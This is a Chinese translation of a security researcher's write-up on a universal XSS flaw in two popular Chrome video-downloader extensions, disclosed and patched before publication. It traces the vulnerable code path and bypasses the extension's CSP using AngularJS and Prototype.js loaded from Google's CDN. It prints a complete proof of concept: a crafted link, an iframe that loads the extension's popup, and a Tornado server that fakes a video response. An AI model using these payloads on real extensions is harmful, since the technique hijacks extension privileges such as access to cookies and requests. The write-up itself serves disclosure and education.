> 原文链接: https://www.anquanke.com//post/id/171711 


# Video Downloader（Plus）Chrome插件漏洞分析：绕过CSP实现UXSS


                                阅读量   
                                **177175**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者thehackerblog，文章来源：thehackerblog.com
                                <br>原文地址：[https://thehackerblog.com/video-download-uxss-exploit-detailed/](https://thehackerblog.com/video-download-uxss-exploit-detailed/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01caf924b2180bb5d4.png)](https://p5.ssl.qhimg.com/t01caf924b2180bb5d4.png)



## 一、前言

在使用[tarnish](https://thehackerblog.com/tarnish/)扫描各种Chrome插件时，我发现[Video Downloader for Chrome version 5.0.0.12](https://chrome.google.com/webstore/detail/video-downloader-for-chro/dcfofgiombegngbaofkeebiipcdgpnga)（820万用户）以及[Video Downloader Plus](https://chrome.google.com/webstore/detail/video-downloader-plus/baejfnndpekpkaaancgpakjaengfpopk)（730万用户）这两款流行的Chrome插件在browser action页面中存在跨站脚本（XSS）漏洞，受害者只需要浏览攻击者控制的某个页面就可以触发漏洞。

该漏洞之所以存在，是因为插件开发者使用字符串连接方式来构建HTML，通过jQuery将HTML动态附加到DOM。攻击者可以构造一个特殊的链接，在插件的上下文中执行任意JavaScript代码。利用该漏洞，攻击者可以滥用该插件具备的权限，包含如下权限：

```
"permissions": [
    "alarms",
    "contextMenus",
    "privacy",
    "storage",
    "cookies",
    "tabs",
    "unlimitedStorage",
    "webNavigation",
    "webRequest",
    "webRequestBlocking",
    "http://*/*",
    "https://*/*",
    "notifications"
],
```

利用上述权限，攻击者可以转储浏览器所有cookie、拦截浏览器所有请求，并仿冒认证用户与所有站点进行通信。插件能做的所有事情攻击者都能做。



## 二、漏洞分析

漏洞的核心在于如下一段代码：

```
vd.createDownloadSection = function(videoData) `{`
    return '&lt;li class="video"&gt; 
        &lt;a class="play-button" href="' + videoData.url + '" target="_blank"&gt;&lt;/a&gt; 
        &lt;div class="title" title="' + videoData.fileName + '"&gt;' + videoData.fileName + '&lt;/div&gt; 
        &lt;a class="download-button" href="' + videoData.url + '" data-file-name="' + videoData.fileName + videoData.extension + '"&gt;Download - ' + Math.floor(videoData.size * 100 / 1024 / 1024) / 100 + ' MB&lt;/a&gt;
        &lt;div class="sep"&gt;&lt;/div&gt;
        &lt;/li&gt;';
`}`;
```

以上代码简直是教科书般的跨站脚本（XSS）漏洞代码。该插件会从攻击者控制的网页中提取视频链接，因此利用方式应该非常直接。然而，现实世界总跟教科书中的情况不一样，往往复杂得多。本文会详细分析漏洞利用过程中遇到的问题，也介绍了如何绕过这些限制。首先从我们的输入点开始分析，然后沿着这条路直达我们的终点。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%B7%AF%E5%BE%84"></a>利用路径

该插件使用[Content Script](https://developer.chrome.com/extensions/content_scripts)从网页链接（`&lt;a&gt;`标签）以及视频链接（`&lt;video&gt;`标签）中收集可能存在的视频URL。Content Scripts实际上是JavaScript代码段，运行在用户在浏览器中已经访问过的网页上（在这种情况下为用户访问过的每一个页面）。以下代码片段摘抄自该扩展的Content Script代码：

```
vd.getVideoLinks = function(node) `{`
    // console.log(node);
    var videoLinks = [];
    $(node)
        .find('a')
        .each(function() `{`
            var link = $(this).attr('href');
            var videoType = vd.getVideoType(link);
            if (videoType) `{`
                videoLinks.push(`{`
                    url: link,
                    fileName: vd.getLinkTitleFromNode($(this)),
                    extension: '.' + videoType
                `}`);
            `}`
        `}`);
    $(node)
        .find('video')
        .each(function() `{`
            // console.log(this);
            var nodes = [];
            // console.log($(this).attr('src'));
            $(this).attr('src') ? nodes.push($(this)) : void 0;
            // console.log(nodes);
            $(this)
                .find('source')
                .each(function() `{`
                    nodes.push($(this));
                `}`);
            nodes.forEach(function(node) `{`
                var link = node.attr('src');
                if (!link) `{`
                    return;
                `}`
                var videoType = vd.getVideoType(link);
                videoLinks.push(`{`
                    url: link,
                    fileName: vd.getLinkTitleFromNode(node),
                    extension: '.' + videoType
                `}`);
            `}`);
        `}`);
    return videoLinks;
`}`;
```

如上所示，代码会迭代处理链接及视频元素，将收集到的信息存放到`videoLinks`数组中然后返回。我们能控制的`videoLinks`元素属性为`url`（来自于`href`属性）及`fileName`（来自于`title`属性、`alt`属性或者节点的内部文本）。

`vd.findVideoLinks`函数会调用上述代码：

```
vd.findVideoLinks = function(node) `{`
    var videoLinks = [];
    switch (window.location.host) `{`
        case 'vimeo.com':
            vd.sendVimeoVideoLinks();
            break;
        case 'www.youtube.com':
            break;
        default:
            videoLinks = vd.getVideoLinks(node);
    `}`
    vd.sendVideoLinks(videoLinks);
`}`;
```

当页面加载时就会调用上面这个函数：

```
vd.init = function() `{`
    vd.findVideoLinks(document.body);
`}`;

vd.init();
```

提取所有链接后，插件会通过`vd.sendVideoLinks`函数将这些链接发送到插件的后台页面。插件后台页面声明的消息监听器如下所示：

```
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) `{`
    switch (request.message) `{`
        case 'add-video-links':
            if (typeof sender.tab === 'undefined') `{`
                break;
            `}`
            vd.addVideoLinks(request.videoLinks, sender.tab.id, sender.tab.url);
            break;
        case 'get-video-links':
            sendResponse(vd.getVideoLinksForTab(request.tabId));
            break;
        case 'download-video-link':
            vd.downloadVideoLink(request.url, request.fileName);
            break;
        case 'show-youtube-warning':
            vd.showYoutubeWarning();
            break;
        default:
            break;
    `}`
`}`);
```

对我们来说，我们关注的是`add-video-links`这个`case`，由于我们的`send.tab`未定义（`undefined`），因此代码会使用前面构造的视频链接数据来调用`vd.addVideoLinks`。`addVideoLinks`的代码如下：

```
vd.addVideoLinks = function(videoLinks, tabId, tabUrl) `{`
    ...trimmed for brevity...
    videoLinks.forEach(function(videoLink) `{`
        // console.log(videoLink);
        videoLink.fileName = vd.getFileName(videoLink.fileName);
        vd.addVideoLinkToTab(videoLink, tabId, tabUrl);
    `}`);
`}`;
```

如上代码会检查之前是否存储了与这个`tabId`对应的链接，如果不满足该情况，则会创建一个新的对象来完成该操作。插件通过`vd.getFileName`函数来遍历每个链接中的`fileName`属性，该函数的代码如下：

```
vd.getFileName = function(str) `{`
    // console.log(str);
    var regex = /[A-Za-z0-9()_ -]/;
    var escapedStr = '';
    str = Array.from(str);
    str.forEach(function(char) `{`
        if (regex.test(char)) `{`
            escapedStr += char;
        `}`
    `}`);
    return escapedStr;
`}`;
```

该函数通过链接的`fileName`属性直接扼杀了我们获得DOM-XSS漏洞的希望。函数会过滤掉与`[A-Za-z0-9()_ -]`正则表达式不匹配的任何字母，其中就包含`"`，而不幸的是我们可以通过该字符打破闭合的HTML属性。

因此留给我们的只有`url`属性，让我们继续分析。

`videoLink`会被发送到`vd.addVideoLinkToTab`函数，该函数如下所示：

```
vd.addVideoLinkToTab = function(videoLink, tabId, tabUrl) `{`
    ...trimmed for brevity...
    if (!videoLink.size) `{`
        console.log('Getting size from server for ' + videoLink.url);
        vd.getVideoDataFromServer(videoLink.url, function(videoData) `{`
            videoLink.size = videoData.size;
            vd.addVideoLinkToTabFinalStep(tabId, videoLink);
        `}`);
    `}` else `{`
        vd.addVideoLinkToTabFinalStep(tabId, videoLink);
    `}`
`}`;
```

该脚本会检查链接是否包含`size`属性。在这种情况下，由于没有设置`size`，因此代码会通过`vd.getVideoDataFromServer`来获取链接地址处的文件大小：

```
vd.getVideoDataFromServer = function(url, callback) `{`
    var request = new XMLHttpRequest();
    request.onreadystatechange = function() `{`
        if (request.readyState === 2) `{`
            callback(`{`
                mime: this.getResponseHeader('Content-Type'),
                size: this.getResponseHeader('Content-Length')
            `}`);
            request.abort();
        `}`
    `}`;
    request.open('Get', url);
    request.send();
`}`;
```

上述代码会发起`XMLHTTPRequest`请求来获取指定链接处文件的头部信息，然后提取其中的`Content-Type`和`Content-Length`字段。这些数据会返回给调用方，然后`videoLinks`元素的`size`属性值会被设置为`Content-Length`字段的值。该操作完成后，结果会传递给`vd.addVideoLinkToTabFinalStep`：

```
vd.addVideoLinkToTabFinalStep = function(tabId, videoLink) `{`
    // console.log("Trying to add url "+ videoLink.url);
    if (!vd.isVideoLinkAlreadyAdded(
            vd.tabsData[tabId].videoLinks,
            videoLink.url
        ) &amp;&amp;
        videoLink.size &gt; 1024 &amp;&amp;
        vd.isVideoUrl(videoLink.url)
    ) `{`
        vd.tabsData[tabId].videoLinks.push(videoLink);
        vd.updateExtensionIcon(tabId);
    `}`
`}`;
```

从现在起我们会开始遇到一些问题。我们需要将URL附加到`vd.tabsData[tabId].videoLinks`数组中，但只有当我们通过如下限制条件时才能做到这一点：

```
!vd.isVideoLinkAlreadyAdded(
    vd.tabsData[tabId].videoLinks,
    videoLink.url
) &amp;&amp;
videoLink.size &gt; 1024 &amp;&amp;
vd.isVideoUrl(videoLink.url)
```

`vd.isVideoLinkAlreadyAdded`只是一个简单的条件，判断`vd.tabsData[tabId].videoLinks`数组中是否已记录URL。第二个条件是判断`videoLink.size`是否大于`1024`。前面提到过，这个值来自于`Content-Length`头部字段。为了绕过检查条件，我们可以创建一个简单的Python Tornado服务器，然后创建一个通配路由，返回足够大的响应：

```
...trimmed for brevity...
def make_app():
    return tornado.web.Application([
        ...trimmed for brevity...
        (r"/.*", WildcardHandler),
    ])

...trimmed for brevity...
class WildcardHandler(tornado.web.RequestHandler):
    def get(self):
        self.set_header("Content-Type", "video/x-flv")
        self.write( ("A" * 2048 ) )
...trimmed for brevity...
```

由于我们使用的是通配型路由，因此无论我们构造什么链接，服务器都会返回大小`&gt; 1024`的一个页面，这样就能帮我们绕过这个检查条件。

下一个检查则要求`vd.isVideoUrl`函数返回`true`，该函数代码如下所示：

```
vd.videoFormats = `{`
    mp4: `{`
        type: 'mp4'
    `}`,
    flv: `{`
        type: 'flv'
    `}`,
    mov: `{`
        type: 'mov'
    `}`,
    webm: `{`
        type: 'webm'
    `}`
`}`;

vd.isVideoUrl = function(url) `{`
    var isVideoUrl = false;
    Object.keys(vd.videoFormats).some(function(format) `{`
        if (url.indexOf(format) != -1) `{`
            isVideoUrl = true;
            return true;
        `}`
    `}`);
    return isVideoUrl;
`}`;
```

这个检查非常简单，只是简单地确保URL中包含`mp4`、`flv`、`mov`或者`webm`。只要在`url`载荷末尾附加一个`.flv`，我们就可以简单地绕过这个限制。

由于我们已经成功满足所有条件，因此我们的`url`会被附加到`vd.tabsData[tabId].videoLinks`数组中。

将目光重新转到原始的`popup.js`脚本，该脚本中包含前面分析的存在漏洞的核心函数，我们可以看到如下代码：

```
$(document).ready(function() `{`
    var videoList = $("#video-list");
    chrome.tabs.query(`{`
        active: true,
        currentWindow: true
    `}`, function(tabs) `{`
        console.log(tabs);
        vd.sendMessage(`{`
            message: 'get-video-links',
            tabId: tabs[0].id
        `}`, function(tabsData) `{`
            console.log(tabsData);
            if (tabsData.url.indexOf('youtube.com') != -1) `{`
                vd.sendMessage(`{`
                    message: 'show-youtube-warning'
                `}`);
                return
            `}`
            var videoLinks = tabsData.videoLinks;
            console.log(videoLinks);
            if (videoLinks.length == 0) `{`
                $("#no-video-found").css('display', 'block');
                videoList.css('display', 'none');
                return
            `}`
            $("#no-video-found").css('display', 'none');
            videoList.css('display', 'block');
            videoLinks.forEach(function(videoLink) `{`
                videoList.append(vd.createDownloadSection(videoLink));
            `}`)
        `}`);
    `}`);
    $('body').on('click', '.download-button', function(e) `{`
        e.preventDefault();
        vd.sendMessage(`{`
            message: 'download-video-link',
            url: $(this).attr('href'),
            fileName: $(this).attr('data-file-name')
        `}`);
    `}`);
`}`);
```

当用户点击浏览器中该插件图标时就会触发上述代码。插件会利用Chrome插件API来请求当前标签页的元数据（metadata），从元数据中获取的ID，然后将`get-video-links`调用发送到后台页面。负责这些操作的代码为`sendResponse(vd.getVideoLinksForTab(request.tabId));`，该代码会返回前面我们讨论过的视频链接。

插件会遍历这些视频链接，将每个链接传递给本文开头处提到过的`vd.createDownloadSection`函数。该函数会通过HTML拼接操作来生成一个较大的字符串，再由jQuery的[`.append()`](http://api.jquery.com/append/)函数附加到DOM中。将用户输入的原始HTML数据传到`append()`函数正是典型的跨站脚本（XSS）场景。

现在似乎我们可以将我们的载荷原封不动地传递到存在漏洞的函数中！然而现在想欢呼胜利还为时过早。我们还需要克服另一个困难：内容安全策略（Content Security Policy，CSP）

### <a class="reference-link" name="%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"></a>内容安全策略

有趣的是，该插件所对应的CSP并没有在`script-src`指令中包含`unsafe-eval`，部分信息摘抄如下：

```
script-src 'self' https://www.google-analytics.com https://ssl.google-analytics.com https://apis.google.com https://ajax.googleapis.com; style-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *; object-src 'self'
```

从上述CSP中我们可以看到`script-src`指令的内容如下：

```
script-src 'self' https://www.google-analytics.com https://ssl.google-analytics.com https://apis.google.com https://ajax.googleapis.com
```

这个策略会阻止我们引用任意站点的源代码，禁止我们使用内联JavaScript声明（比如`&lt;script&gt;alert('XSS')&lt;/script&gt;`）。我们能执行JavaScript的唯一方法就是引用如下站点的源：
- `https://www.google-analytics.com`
- `https://ssl.google-analytics.com`
- `https://apis.google.com`
- `https://ajax.googleapis.com`
当我们想绕过CSP策略时，如果看到`script-src`指令中同时包含`https://apis.google.com`以及`https://ajax.googleapis.com`是非常好的一件事。这些站点上托管着许多JavaScript库，也包含JSONP端点：这两者对我们绕过CSP而言都非常有用。

> 注意：如果我们想判断某个站点是否不适合加入CSP中，可以使用一些天才的Google员工所开发的[CSP评估工具](https://csp-evaluator.withgoogle.com/)，这里特别要感谢<a>@we1x</a>。

这里再说一些题外话，大家可以了解一下 [`H5SC Minichallenge 3: "Sh*t, it's CSP!"`](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)比赛，其中参赛者必须在某个页面上获得XSS利用点，而该页面只将`ajax.googeapis.com`加入站点白名单中。这个[挑战](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22#rules)与我们当前面临的处境非常相似。

这个挑战有多种解法，其中比较机智的解法是使用如下载荷：

```
"ng-app ng-csp&gt;&lt;base href=//ajax.googleapis.com/ajax/libs/&gt;&lt;script src=angularjs/1.0.1/angular.js&gt;&lt;/script&gt;&lt;script src=prototype/1.7.2.0/prototype.js&gt;&lt;/script&gt;`{``{`$on.curry.call().alert(1337
```

提供该解法的参赛者提到如下一段话：

> 这种解法非常有趣，将Prototype.js与AngularJS结合起来就能实现滥用目标。AngularJS可以成功禁止用户使用其集成的沙盒来访问窗口，然而Prototype.JS使用了`curry`属性扩展了代码功能。一旦在该属性上使用`call()`调用，就会返回一个窗口对象，而AngularJS不会注意到这个操作。这意味着我们可以使用Prototype.JS来获取窗口，然后几乎可以执行该对象的所有方法。
在白名单中的Google-CDN站点提供了比较过时的AngularJS版本以及Prototype.JS，这样我们就能访问窗口操作所需的数据，并且不需要用户操作就能完成该任务。

修改这个载荷后，我们也可以将其用在这个扩展上。如下载荷使用了相同的技术来执行`alert('XSS in Video Downloader for Chrome by mandatory')`：

```
"ng-app ng-csp&gt;&lt;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js&gt;&lt;/script&gt;&lt;script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js&gt;&lt;/script&gt;`{``{`$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')`}``}`&lt;!--

```

点击插件图标后，就会弹出警告窗口，如下所示：

[![](https://p4.ssl.qhimg.com/t0148e3ef73aca1c16e.png)](https://p4.ssl.qhimg.com/t0148e3ef73aca1c16e.png)

现在我们已经可以在插件上下文中执行任意JavaScript代码，也能滥用该插件能访问的所有Chrome插件API。然而，攻击过程中我们的确需要用户在我们的恶意页面上点击插件图标。在构造利用路径时，我们最好不要将弱点暴露给别人，因此我们还是要尝试下无需用户交互的利用过程。

回到`manifest.json`，我们可以看到`web_accessible_resources`指令的值如下：

```
"web_accessible_resources": [
    "*"
]
```

这里只使用了一个通配符，意味着任意网页都可以以`&lt;iframe&gt;`方式引用插件中包含的任意资源。在这种情况下，我们需要包含的资源是`popup.html`页面。通常情况下，只有当用户点击插件图标时才会显示该页面。以`&lt;iframe&gt;`方式引用该页面，再配合我们之前构造的载荷后，我们就能获得无需用户交互的漏洞利用方式：

[![](https://p3.ssl.qhimg.com/t013a196daa3573e165.png)](https://p3.ssl.qhimg.com/t013a196daa3573e165.png)

最终载荷如下所示：

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
    &lt;a href="https://"ng-app ng-csp&gt;&lt;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js&gt;&lt;/script&gt;&lt;script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js&gt;&lt;/script&gt;`{``{`$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')`}``}`&lt;!--.flv"&gt;test&lt;/a&gt;

    &lt;iframe src="about:blank" id="poc"&gt;&lt;/iframe&gt;

    &lt;script&gt;
    setTimeout(function() `{`
        document.getElementById( "poc" ).setAttribute( "src", "chrome-extension://dcfofgiombegngbaofkeebiipcdgpnga/html/popup.html" );
    `}`, 1000);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

```

如上代码可以分为两部分：第一部分，为当前的标签页设置`videoLinks`数组。第二部分，在1秒后触发利用代码，设置`iframe`源地址为`chrome-extension://dcfofgiombegngbaofkeebiipcdgpnga/html/popup.html`（即popup页面）。最终PoC代码（包含Python服务器在内的所有代码）如下所示：

```
import tornado.ioloop
import tornado.web

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("""
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
    &lt;a href="https://"ng-app ng-csp&gt;&lt;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js&gt;&lt;/script&gt;&lt;script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js&gt;&lt;/script&gt;`{``{`$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')`}``}`&lt;!--.flv"&gt;test&lt;/a&gt;

    &lt;iframe src="about:blank" id="poc"&gt;&lt;/iframe&gt;

    &lt;script&gt;
    setTimeout(function() `{`
        document.getElementById( "poc" ).setAttribute( "src", "chrome-extension://dcfofgiombegngbaofkeebiipcdgpnga/html/popup.html" );
    `}`, 1000);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
        """)

class WildcardHandler(tornado.web.RequestHandler):
    def get(self):
        self.set_header("Content-Type", "video/x-flv")
        self.write( ("A" * 2048 ) )

def make_app():
    return tornado.web.Application([
        (r"/", MainHandler),
        (r"/.*", WildcardHandler),
    ])

if __name__ == "__main__":
    app = make_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.current().start()
```



## 三、披露及缓解措施

由于我找不到该插件任何一名开发者的明显联系方式（Chrome插件页面上给出的联系方式非常有限），因此我联系了Google方面从事Chrome插件安全性研究的一些人。小伙伴们通知了插件开发者，及时推出了修复补丁。这两款插件的最新版都修复了本文提到的漏洞。与此同时，当使用该插件的用户自动更新插件版本后我们才发表这篇文章，因此大家应该都已打好补丁。



## 四、总结

如果大家有任何问题或者建议，可以随时[联系我](https://twitter.com/IAmMandatory)。如果想自己查找一些Chrome插件程序的漏洞，可以尝试使用我开发的[tarnish](https://thehackerblog.com/tarnish/)扫描器，应该能帮大家入门（工具源代码请访问[Github](https://github.com/mandatoryprogrammer/tarnish)）。如果想了解关于Chrome插件安全性方面的简介，可以参考“[Kicking the Rims – A Guide for Securely Writing and Auditing Chrome Extensions](https://thehackerblog.com/kicking-the-rims-a-guide-for-securely-writing-and-auditing-chrome-extensions/)”这篇文章。
